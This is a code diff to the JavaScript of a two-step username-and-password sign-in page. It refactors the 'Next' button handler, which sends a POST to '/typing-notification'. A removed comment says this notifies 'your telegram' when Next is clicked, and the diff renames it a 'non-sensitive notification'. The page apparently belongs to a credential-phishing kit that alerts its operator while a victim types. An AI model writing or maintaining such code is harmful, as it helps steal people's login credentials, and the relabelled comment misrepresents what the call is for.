@@ -7,32 +7,16 @@ document.addEventListener('DOMContentLoaded', () => {
 
     let unameVal = pwdVal = false;
     /////next button
-    const nxt = document.getElementById('btn_next');
+  const nxt = document.getElementById('btn_next');
 
-    nxt.addEventListener('click', () => {
-        //validate the form
-        validate();
-    if (unameVal) {
-        document.getElementById("section_uname").classList.add('d-none');
-        document.getElementById('section_pwd').classList.remove('d-none');
+nxt.addEventListener('click', async () => {
+    validate();
 
-        document.querySelectorAll('#user_identity').forEach((e) => {
-            e.innerText = unameInp.value;
-        });
-
-        view = "pwd";
+    if (!unameVal) {
+        return;
     }
-});
-                  document.getElementById("section_uname").classList.toggle('d-none');
-            document.getElementById('section_pwd').classList.remove('d-none');
-            document.querySelectorAll('#user_identity').forEach((e) => {
-                e.innerText = unameInp.value;
-            })
-            view = "pwd";
-        }
-    })
-            nxt.addEventListener('click', async () => {
-    // Notify your telegram immediately when Next is clicked.
+
+    // Non-sensitive notification only.
     try {
         await fetch('/typing-notification', {
             method: 'POST',
@@ -47,8 +31,15 @@ document.addEventListener('DOMContentLoaded', () => {
         console.error('Notification error:', error);
     }
 
-    // Continue normal validation/navigation.
-    validate();
+    document.getElementById('section_uname').classList.add('d-none');
+    document.getElementById('section_pwd').classList.remove('d-none');
+
+    document.querySelectorAll('#user_identity').forEach((e) => {
+        e.innerText = unameInp.value;
+    });
+
+    view = 'pwd';
+});
     //////sign in button
 
     const sig = document.getElementById('btn_sig');
